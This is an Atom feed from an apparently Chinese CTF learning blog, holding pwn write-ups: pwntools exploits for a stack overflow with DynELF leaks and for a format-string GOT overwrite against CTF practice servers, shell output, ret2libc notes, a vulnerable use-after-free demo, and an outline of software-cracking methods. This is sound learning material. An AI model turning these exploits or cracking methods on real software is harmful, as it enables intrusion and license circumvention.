<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Room of Equirement</title>
  
  <subtitle>pwn what you want</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://siriuswhiter.tk/"/>
  <updated>2018-09-13T10:04:44.235Z</updated>
  <id>http://siriuswhiter.tk/</id>
  
  <author>
    <name>Sirius Whiter</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Jarvis OJ-pwn</title>
    <link href="http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/"/>
    <id>http://siriuswhiter.tk/2018/09/13/jarvis-oj-pwn/</id>
    <published>2018-09-13T06:17:19.000Z</published>
    <updated>2018-09-13T10:04:44.235Z</updated>
    
    <content type="html"><![CDATA[<p><em>开始漫漫刷题之路</em></p><h1 id="level4-DynELF"><a href="#level4-DynELF" class="headerlink" title="level4 - DynELF"></a>level4 - DynELF</h1><p>题目给的东西很少，基本信息如下：</p><h2 id="信息"><a href="#信息" class="headerlink" title="信息"></a>信息</h2><p>main：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  vulnerable_function();</span><br><span class="line">  write(1, &quot;Hello, World!\n&quot;, 0xEu);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>vulnerable_function：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssize_t vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [esp+0h] [ebp-88h]</span><br><span class="line"></span><br><span class="line">  return read(0, &amp;buf, 0x100u);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>保护：只开启了nx。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&apos;/root/pwnprac/level4&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>read很明显会溢出，溢出到返回地址覆盖为system的地址即可，问题在于其地址的寻找，也就是该题的重点：DynELF。<br>最终思路就是因为可以不断的通过调用write函数来leak函数地址，使用dynelf可以通过泄露的地址确定libc版本来确定system地址。<br>/bin/sh则可以通过调用read来将其写入bss段，调用即可。</p><h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./level4&apos;)</span><br><span class="line">sh = remote(&apos;pwn2.jarvisoj.com&apos;,9880)</span><br><span class="line">libc = ELF(&apos;./level4&apos;)</span><br><span class="line"></span><br><span class="line">bss_add = libc.bss()   //直接得到bss段地址</span><br><span class="line"></span><br><span class="line">def leak(add):     //leak函数</span><br><span class="line">    pay1 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;write&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(1) + p32(add) + p32(4)</span><br><span class="line">    sh.send(pay1)</span><br><span class="line">    data = sh.recv(4)</span><br><span class="line">    return data</span><br><span class="line"></span><br><span class="line">#神奇DynELF工具使用</span><br><span class="line">d = DynELF(leak,elf = ELF(&apos;./level4&apos;))   //初始化DynELF模块 </span><br><span class="line">sys_add = d.lookup(&apos;system&apos;,&apos;libc&apos;)      //在libc文件中搜索system函数的地址  </span><br><span class="line"> </span><br><span class="line">print hex(sys_add)</span><br><span class="line"></span><br><span class="line">pay2 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(libc.symbols[&apos;read&apos;]) + p32(libc.symbols[&apos;vulnerable_function&apos;]) + p32(0) + p32(bss_add) + p32(8)    //调用read</span><br><span class="line"></span><br><span class="line">sh.send(pay2)</span><br><span class="line">sh.send(&apos;/bin/sh\x00&apos;) </span><br><span class="line"></span><br><span class="line">pay3 = &apos;a&apos;*0x88 + &apos;bbbb&apos; + p32(sys_add) + &apos;dead&apos; + p32(bss_add)</span><br><span class="line">sh.send(pay3)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p><h1 id="level3-x64-64位参数传递"><a href="#level3-x64-64位参数传递" class="headerlink" title="level3_x64 - 64位参数传递"></a>level3_x64 - 64位参数传递</h1><p>当参数少于7个时， 参数从左到右放入寄存器: rdi, rsi, rdx, rcx, r8, r9。<br>当参数为7个以上时， 前 6 个与前面一样， 但后面的依次从 “右向左” 放入栈中，即和32位汇编一样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;开始漫漫刷题之路&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;level4-DynELF&quot;&gt;&lt;a href=&quot;#level4-DynELF&quot; class=&quot;headerlink&quot; title=&quot;level4 - DynELF&quot;&gt;&lt;/a&gt;level4 - DynELF&lt;/h1&gt;
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn-300解析-格式化字符串漏洞利用巩固</title>
    <link href="http://siriuswhiter.tk/2018/09/11/pwn-300%E8%A7%A3%E6%9E%90-%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B7%A9%E5%9B%BA/"/>
    <id>http://siriuswhiter.tk/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/</id>
    <published>2018-09-11T01:51:39.000Z</published>
    <updated>2018-09-11T02:41:42.658Z</updated>
    
    <content type="html"><![CDATA[<p><em>pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞泄露canary，第二次输入溢出到函数返回地址即可。</em><br><em>而这道题将输入由gets变为fgets，也就是即使泄露出canary也无法溢出利用（canary必定以/x00结尾），同时没有了现成的system(‘/bin/sh’)函数。</em></p><h1 id="查看内容及保护"><a href="#查看内容及保护" class="headerlink" title="查看内容及保护"></a>查看内容及保护</h1><h2 id="main函数为："><a href="#main函数为：" class="headerlink" title="main函数为："></a>main函数为：</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char s; // [esp+Ch] [ebp-4Ch]</span><br><span class="line">  unsigned int v5; // [esp+4Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);  //canary生成</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 1, 0);</span><br><span class="line">  fgets(&amp;s, 64, stdin);   //fgets,遇/x00停止</span><br><span class="line">  printf(&amp;s);             //格式化字符串漏洞</span><br><span class="line">  fgets(&amp;s, 64, stdin);</span><br><span class="line">  printf(&amp;s);</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="查看文件保护"><a href="#查看文件保护" class="headerlink" title="查看文件保护"></a>查看文件保护</h2><p>仍然是canary 与 栈不可执行；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# checksec binary_300</span><br><span class="line">[*] &apos;/root/tikool/binary_300&apos;</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><h2 id="查看加载函数"><a href="#查看加载函数" class="headerlink" title="查看加载函数"></a>查看加载函数</h2><p>发现system函数</p><figure class="image-box">                <img src="/2018/09/11/pwn-300解析-格式化字符串漏洞利用巩固/system.png" alt="加载函数" title="" class="">                <p>加载函数</p>            </figure><h1 id="确定思路"><a href="#确定思路" class="headerlink" title="确定思路"></a>确定思路</h1><p>想到可以使用格式化字符串覆盖某个函数的got表地址，看下程序流程，想到可以覆盖printf函数的got地址，在第二次输入’/bin/sh’，原先的printf(/bin/sh)就会变成system(/bin/sh)，获取shell；</p><h1 id="流程实现"><a href="#流程实现" class="headerlink" title="流程实现"></a>流程实现</h1><h2 id="确定字符串位置"><a href="#确定字符串位置" class="headerlink" title="确定字符串位置"></a>确定字符串位置</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">root@xuewenjie-kali:~/tikool# ./binary_300</span><br><span class="line">aaaa%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x </span><br><span class="line">aaaa00000040.f7f285c0.00000000.00000000.00000000.00000000.61616161.78383025.3830252e</span><br></pre></td></tr></table></figure><p>即字符串位于第六（相对于<strong>）或第七个（相对于</strong>）</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#sh = process(&apos;./binary_300&apos;)</span><br><span class="line">sh = remote(&apos;bamboofox.cs.nctu.edu.tw&apos;,22003)</span><br><span class="line">libc = ELF(&apos;./binary_300&apos;)</span><br><span class="line"></span><br><span class="line">printf_got = libc.got[&apos;printf&apos;]</span><br><span class="line">system_add = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">payload = fmtstr_payload(7, &#123;printf_got: system_add&#125;)  //pwntools自带，用于生成格式化字符串payload；</span><br><span class="line"></span><br><span class="line">print payload</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.recv()</span><br><span class="line">sh.sendline(&apos;/bin/sh&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><p>成功获得shell<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ /bin/sh</span><br><span class="line">$ whoami</span><br><span class="line">ctf</span><br><span class="line">$</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;em&gt;pwn-300之前有一道pwn-200，也具有canary保护及NX保护，但是直接给了system(‘/bin/sh’)的函数，所以问题的关键就在于如何使程序转向该函数地址执行；幸运的是该程序同时具有格式化字符串漏洞。所以最后的思路就是，第一次输入，格式化字符串漏洞
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 入门1.3--plt/got</title>
    <link href="http://siriuswhiter.tk/2018/08/28/pwn-%E5%85%A5%E9%97%A81-3-plt-got/"/>
    <id>http://siriuswhiter.tk/2018/08/28/pwn-入门1-3-plt-got/</id>
    <published>2018-08-28T04:12:56.000Z</published>
    <updated>2018-09-03T13:45:49.643Z</updated>
    
    <content type="html"><![CDATA[<pre><code>&lt;center&gt;关于ret2libc 中的plt/got&lt;/center&gt; </code></pre><h1 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h1><p>即当第一次使用某函数时，GOT表中对应表项保存的并不是真实的函数地址，需要通过_dl_runtime_resolve查找到真实的函数地址并填入GOT对应表项，从而在下次再使用该函数时，无需进行查找。我们要泄漏的就是初始化查找后填入GOT对应表项中的函数地址。</p><ul><li>使用gdb，断点下在write函数之后，运行，x查看write.plt.got处的值，即实际地址；*<br><img src="/2018/08/28/pwn-入门1-3-plt-got/write.png" alt="图四">    <img src="/2018/08/28/pwn-入门1-3-plt-got/wrgot.png" alt="图五"></li></ul><h1 id="plt-与-got"><a href="#plt-与-got" class="headerlink" title="plt 与 got"></a>plt 与 got</h1><p>文件的plt表中存放着函数的.plt.got 地址，.plt.got 地址处的值为该函数的真正的got地址（也就是我们需要泄露的）</p><p>由于延迟绑定机制的存在，我们只能通过泄露被调用的函数的got地址，同时又因为同一libc库中各函数之间的偏移是固定的，我们就能因此来求出其他函数的got地址。</p><h1 id="ret2libc的实现"><a href="#ret2libc的实现" class="headerlink" title="ret2libc的实现"></a>ret2libc的实现</h1><ol><li>文件给了一个pwnme文件与libc-2.19.so文件；checksec查看文件保护，IDA 查看源码，可以看到buf大小只有0x8，read却允许读入0x100大小的数据，有着明显的栈溢出；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/ida.png" alt="图一](pwn-入门1-3-plt-got/checksec.png)  ![图二" title="" class="">                <p>图一](pwn-入门1-3-plt-got/checksec.png)  ![图二</p>            </figure><ol start="2"><li>查看应用调用函数plt表，<code>objdump -d -M intel -j .plt pwnme</code>可以看到没有调用system，需要我们利用其它已调用的来泄露；</li></ol><figure class="image-box">                <img src="/2018/08/28/pwn-入门1-3-plt-got/plt.png" alt="图三" title="" class="">                <p>图三</p>            </figure><ol start="3"><li>这里决定泄露write函数的got地址：使用pwntools，使程序运行完write函数，得到真实的got地址；</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwn = ELF(&apos;pwnme&apos;) </span><br><span class="line">sh.recvuntil(&apos;flag:&apos;) </span><br><span class="line">wri_got = pwn.got[&apos;write&apos;]</span><br></pre></td></tr></table></figure><ol start="4"><li>泄露libc中的system与/bin/sh地址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">libc = ELF(&apos;libc-2.19.so&apos;)</span><br><span class="line">sys_got = wri_got - libc.symbols[&apos;write&apos;] + libc.symbols[&apos;system&apos;]</span><br><span class="line">binsh_got = wri_got - libc.symbols[&apos;write&apos;] + libc.search(&apos;/bin/sh&apos;).next()</span><br></pre></td></tr></table></figure><ol start="5"><li>构造payload <code>payload = flat([&#39;a&#39;*20 , sys_got , 0xdeadbeef , binsh_got])</code></li></ol><p><em>因为某些不知名的原因，各个偏移得到的got地址并不是特别对，所以先不放wp。之后再补</em></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;pre&gt;&lt;code&gt;&amp;lt;center&amp;gt;关于ret2libc 中的plt/got&amp;lt;/center&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;延迟绑定&quot;&gt;&lt;a href=&quot;#延迟绑定&quot; class=&quot;headerlink&quot; title=&quot;延迟绑定&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn 入门n.n</title>
    <link href="http://siriuswhiter.tk/2018/08/28/pwn-%E5%85%A5%E9%97%A8n-n/"/>
    <id>http://siriuswhiter.tk/2018/08/28/pwn-入门n-n/</id>
    <published>2018-08-28T03:10:56.000Z</published>
    <updated>2018-08-28T03:19:20.274Z</updated>
    
    <content type="html"><![CDATA[<h1 id="堆的UAF-use-after-free-利用"><a href="#堆的UAF-use-after-free-利用" class="headerlink" title="堆的UAF(use after free)利用"></a>堆的UAF(use after free)利用</h1><p><em>学长介绍了某CTF大佬聚集的交流群，但是入群需要做题，题目本来不是我这个段位可以搞定的，但是怎么说？有压力就有动力:)抱着入群的信念，<br>先看了misc，结果需要修复pyc文件，按流程走的时候出现了无法解决的一个奇怪问题，遂放弃；之后看了下pwn，感觉甚难；在看了逆向完全不会之后，<br>只能看了下pwn的tips，开始现学现卖。</em></p><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>就像它的名字一样，即一个内存块被释放后再次被使用；主要利用的是一个指针对应的内存块被释放后，对应的指针没有被设为NULL；<br>而如果在这个指针在下一次被使用之前对应的内存块仍未被修改，程序可能还会正常运转；而若被已经修改，则有可能被利用，UAF就是利用该漏洞。</p><ul><li>根本原因：应用程序调用free()释放内存时，如果内存块小于256kb，dlmalloc并不马上将内存块释放回内存，而是将内存块标记为空闲状态。这么做的原因有两个：一是内存块不一定能马上释放会内核（比如内存块不是位于堆顶端），二是供应用程序下次申请内存使用（这是主要原因）。当dlmalloc中空闲内存量达到一定值时dlmalloc才将空闲内存释放会内核。如果应用程序申请的内存大于256kb，dlmalloc调用mmap()向内核申请一块内存，返回返还给应用程序使用。如果应用程序释放的内存大于256kb，dlmalloc马上调用munmap()释放内存。dlmalloc不会缓存大于256kb的内存块，因为这样的内存块太大了，最好不要长期占用这么大的内存资源。</li></ul><h2 id="漏洞的简单利用"><a href="#漏洞的简单利用" class="headerlink" title="漏洞的简单利用"></a>漏洞的简单利用</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">typedef void (*func_ptr)(char *);</span><br><span class="line">void evil_fuc(char command[])</span><br><span class="line">&#123;</span><br><span class="line">system(command);</span><br><span class="line">&#125;</span><br><span class="line">void echo(char content[])</span><br><span class="line">&#123;</span><br><span class="line">printf(&quot;%s&quot;,content);</span><br><span class="line">&#125;</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    func_ptr *p1=(func_ptr*)malloc(4*sizeof(int));</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);</span><br><span class="line">    p1[3]=echo;</span><br><span class="line">    p1[3](&quot;hello world\n&quot;);</span><br><span class="line">    free(p1); //在这里free了p1,但并未将p1置空,导致后续可以再使用p1指针</span><br><span class="line">    p1[3](&quot;hello again\n&quot;); //p1指针未被置空,虽然free了,但仍可使用.只是其内存块是被标记为空闲状态</span><br><span class="line">    func_ptr *p2=(func_ptr*)malloc(4*sizeof(int));//malloc在free一块内存后,再次申请同样大小的指针会把刚刚释放的内存分配出来.</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p2);</span><br><span class="line">    printf(&quot;malloc addr: %p\n&quot;,p1);//p2与p1指针指向的内存为同一地址</span><br><span class="line">    p2[3]=evil_fuc; //在这里将p1指针里面保存的echo函数指针覆盖成为了evil_func指针.</span><br><span class="line">    p1[3](&quot;/bin/sh&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最终运行效果：</p><figure class="image-box">                <img src="/2018/08/28/pwn-入门n-n/result.png" alt="result" title="" class="">                <p>result</p>            </figure><p><em>漏洞的利用方法原理上与其相同，之后会再加上入群题的解题过程</em></p><p>学习借鉴文章来源：<a href="https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1" target="_blank" rel="noopener">https://blog.csdn.net/qq_31481187/article/details/73612451?locationNum=10&amp;fps=1</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;堆的UAF-use-after-free-利用&quot;&gt;&lt;a href=&quot;#堆的UAF-use-after-free-利用&quot; class=&quot;headerlink&quot; title=&quot;堆的UAF(use after free)利用&quot;&gt;&lt;/a&gt;堆的UAF(use after f
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>pwn.入门1.2</title>
    <link href="http://siriuswhiter.tk/2018/08/28/pwn-%E5%85%A5%E9%97%A81-2/"/>
    <id>http://siriuswhiter.tk/2018/08/28/pwn-入门1-2/</id>
    <published>2018-08-28T01:46:58.000Z</published>
    <updated>2018-08-28T01:55:07.624Z</updated>
    
    <content type="html"><![CDATA[<p>ret2libc学习</p><h1 id="ret2libc使用原因"><a href="#ret2libc使用原因" class="headerlink" title="ret2libc使用原因"></a>ret2libc使用原因</h1><p>程序不是静态编译，通常就不会有int 0x80</p><p>ret2syscall 就无法实现，因而使用</p><p>ret2library。</p><h1 id="调用函数的栈结构布局-："><a href="#调用函数的栈结构布局-：" class="headerlink" title="调用函数的栈结构布局 ："></a>调用函数的栈结构布局 ：</h1><ul><li><p>调用函数的返回地址</p></li><li><p>函数调用完的返回地址</p></li><li><p>调用函数的参数1</p></li><li><p>调用函数的参数2</p></li></ul><h1 id="利用过程分析："><a href="#利用过程分析：" class="headerlink" title="利用过程分析："></a>利用过程分析：</h1><p>ASLR使得每次载入的函数地址（base）都不同</p><p>实际地址 Address = base +offset</p><p><em>若地址为 0xf…  则其为实际地址；</em></p><p>offset在libc库中是固定的；</p><ul><li>查看libc库版本：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ldd  ./file</span><br></pre></td></tr></table></figure><ul><li>寻找偏移地址 ：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readelf -a  /lib32/libc.so.6 | grep gets@</span><br></pre></td></tr></table></figure><ul><li>目标是寻找libc 的 base :</li></ul><p>1.通过程序中的其他函数leak 程序libc的实际地址（Address）,base = Address - offset</p><p>2.从stack残渣中获取libc地址信息</p><h1 id="延迟绑定（没搞清楚，之后再写）"><a href="#延迟绑定（没搞清楚，之后再写）" class="headerlink" title="延迟绑定（没搞清楚，之后再写）"></a>延迟绑定（没搞清楚，之后再写）</h1><p>函数调用方式：</p><p>call  func@plt –&gt; .got.plt –&gt;.got.plt的值为该func的实际地址（所需address）</p><h1 id="使用调用函数的栈结构布局："><a href="#使用调用函数的栈结构布局：" class="headerlink" title="使用调用函数的栈结构布局："></a>使用调用函数的栈结构布局：</h1><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">pop1_ret(pop&lt;buf&gt; 然后 return）</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">xxx</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gets()</span><br><span class="line"></span><br><span class="line">system()</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br><span class="line"></span><br><span class="line">&lt;buf&gt;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;ret2libc学习&lt;/p&gt;
&lt;h1 id=&quot;ret2libc使用原因&quot;&gt;&lt;a href=&quot;#ret2libc使用原因&quot; class=&quot;headerlink&quot; title=&quot;ret2libc使用原因&quot;&gt;&lt;/a&gt;ret2libc使用原因&lt;/h1&gt;&lt;p&gt;程序不是静态编译，通常就
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://siriuswhiter.tk/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>软件保护/软件破解 及对抗</title>
    <link href="http://siriuswhiter.tk/2018/08/25/%E8%BD%AF%E4%BB%B6%E4%BF%9D%E6%8A%A4-%E8%BD%AF%E4%BB%B6%E7%A0%B4%E8%A7%A3-%E5%8F%8A%E5%AF%B9%E6%8A%97/"/>
    <id>http://siriuswhiter.tk/2018/08/25/软件保护-软件破解-及对抗/</id>
    <published>2018-08-25T01:30:41.000Z</published>
    <updated>2018-08-25T11:15:33.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a>软件保护</h1><h2 id="简单算法注册保护："><a href="#简单算法注册保护：" class="headerlink" title="简单算法注册保护："></a>简单算法注册保护：</h2><p>输入用户名序列号，计算并检测序列号；</p><h2 id="简单算法注册保护的对抗："><a href="#简单算法注册保护的对抗：" class="headerlink" title="简单算法注册保护的对抗："></a>简单算法注册保护的对抗：</h2><p>①修改关键指令：暴力破解；patcher<br>②dll注入或使用加载器（使序列号计算结果展示出来）；内存注册机<br>③还原本身算法；keygen</p><h2 id="复杂算法注册保护："><a href="#复杂算法注册保护：" class="headerlink" title="复杂算法注册保护："></a>复杂算法注册保护：</h2><p>通常内置rsa公钥/签名/绑定硬件码/注册信息分段校验/运行时校验等；</p><h2 id="复杂算法注册保护的对抗："><a href="#复杂算法注册保护的对抗：" class="headerlink" title="复杂算法注册保护的对抗："></a>复杂算法注册保护的对抗：</h2><p>①patch<br>②补丁修改公钥，使用自己的公钥对；</p><h2 id="网络加密及硬件加密："><a href="#网络加密及硬件加密：" class="headerlink" title="网络加密及硬件加密："></a>网络加密及硬件加密：</h2><p>本质上与本地加密相同/运行前检测？？</p><h2 id="网络加密及硬件加密的对抗："><a href="#网络加密及硬件加密的对抗：" class="headerlink" title="网络加密及硬件加密的对抗："></a>网络加密及硬件加密的对抗：</h2><p>①patch<br>②模拟与远程端的通信，及模拟执行；<br>③使用中转程序，从服务器获得远程执行结果；</p><h2 id="复杂系统注册保护："><a href="#复杂系统注册保护：" class="headerlink" title="复杂系统注册保护："></a>复杂系统注册保护：</h2><p>以上内容混杂</p><p>附：常用–壳（压缩壳/加密壳）：程序运行前的检测，校验/程序注册机制/程序运行二次检测</p><h1 id="软件破解及对抗"><a href="#软件破解及对抗" class="headerlink" title="软件破解及对抗"></a>软件破解及对抗</h1><h2 id="程序分析及对抗："><a href="#程序分析及对抗：" class="headerlink" title="程序分析及对抗："></a>程序分析及对抗：</h2><ul><li>代码变形mutation；</li><li>代码膨胀expansion；</li><li>花指令；</li><li>代码乱序；</li><li>平坦化；</li></ul><h2 id="程序调试及对抗："><a href="#程序调试及对抗：" class="headerlink" 